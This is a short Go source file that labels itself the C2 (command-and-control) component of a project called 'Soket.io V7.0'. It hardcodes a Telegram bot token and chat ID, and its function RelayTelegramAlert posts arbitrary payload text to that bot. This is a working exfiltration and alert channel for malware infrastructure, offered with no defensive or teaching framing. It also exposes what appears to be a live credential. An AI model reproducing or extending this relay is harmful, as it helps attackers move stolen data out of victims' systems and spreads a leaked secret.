// Project: Soket.io V7.0
// Module: C2 Component
// Description: Professional C2 Infrastructure component.

package telegram

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

const (
	TelegramBotToken = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
	TelegramChatID   = "5439698489"
	TelegramAPIURL   = "https://api.telegram.org/bot%s/sendMessage"
)

func RelayTelegramAlert(payload string) error {
	apiURL := fmt.Sprintf(TelegramAPIURL, TelegramBotToken)

	data := url.Values{}
	data.Set("chat_id", TelegramChatID)
	data.Set("text", strings.TrimSpace(payload))

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.PostForm(apiURL, data)
	if err != nil {
		return fmt.Errorf("failed to send telegram request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned non-OK status: %s", resp.Status)
	}

	return nil
}
